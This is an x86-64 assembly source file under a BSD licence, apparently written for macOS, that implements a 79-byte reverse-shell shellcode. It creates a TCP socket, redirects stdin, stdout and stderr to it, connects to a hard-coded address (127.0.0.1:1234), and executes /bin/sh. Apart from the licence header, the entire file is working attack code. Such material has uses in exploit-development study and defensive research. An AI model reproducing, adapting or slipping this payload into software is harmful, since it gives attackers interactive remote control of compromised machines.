;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
; 79 byte reverse shell
;
    bits    64

    mov     rcx, ~0x0100007fd2040200
    not     rcx
    push    rcx
    
    xor     ebp, ebp
    bts     ebp, 25
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    rbp
    pop     rax
    cdq                      ; rdx=IPPROTO_IP
    push    1
    pop     rsi              ; rsi=SOCK_STREAM
    push    2
    pop     rdi              ; rdi=AF_INET  
    mov     al, 97
    syscall
    
    xchg    eax, edi         ; edi=s
    xchg    eax, esi         ; esi=2
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2(r, FILENO_STDIN)
    ; dup2(r, FILENO_STDOUT)
    ; dup2(r, FILENO_STDERR)
dup_loop64:
    push    rbp
    pop     rax              ; eax = 0x02000000 
    mov     al, 90           ; rax=sys_dup2
    syscall
    sub     esi, 1
    jns     dup_loop64       ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (sockfd, {AF_INET,1234,127.0.0.1}, 16);
    push    rbp
    pop     rax
    push    rsp
    pop     rsi
    mov     dl, 16           ; rdx=sizeof(sa)
    mov     al, 98           ; rax=sys_connect
    syscall    
    
    ; step 4, execute /bin/sh
    ; execve("/bin//sh", NULL, 0);
    push    rax
    pop     rsi
    push    rbp
    pop     rax
    cdq                      ; rdx=0
    mov     rbx, '/bin//sh'
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; "/bin//sh", 0
    mov     al, 59           ; rax=sys_execve
    syscall
    
    
